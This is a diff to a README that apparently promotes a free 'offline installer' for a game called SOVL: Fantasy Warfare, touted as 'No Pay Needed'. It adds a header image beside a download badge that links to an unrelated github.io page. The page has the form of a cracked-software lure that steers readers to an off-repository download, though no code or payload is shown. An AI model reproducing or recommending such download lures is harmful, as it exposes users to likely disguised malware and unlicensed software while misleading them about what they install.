@@ -20,6 +20,10 @@
   <img src="https://readme-typing-svg.herokuapp.com?color=F9A825&size=28&center=true&vCenter=true&width=900&lines=🎮+SOVL:+Fantasy+Warfare+Offline+Installer;⭐+Professional+Grade+Software;🌟+Full+Offline+Installation+2026;🔥+No+Pay+Needed" />
 </p>
 
+<p align="center">
+  <img src="./header.jpg" alt="SOVL: Fantasy Warfare" width="460" />
+</p>
+
 <div align="center">
 
 [![Download](https://img.shields.io/badge/⬇_Download_SOVL:%20Fantasy%20Warfare-F9A825?style=for-the-badge&logo=github)](https://beatowlrouse.github.io/windownload/)
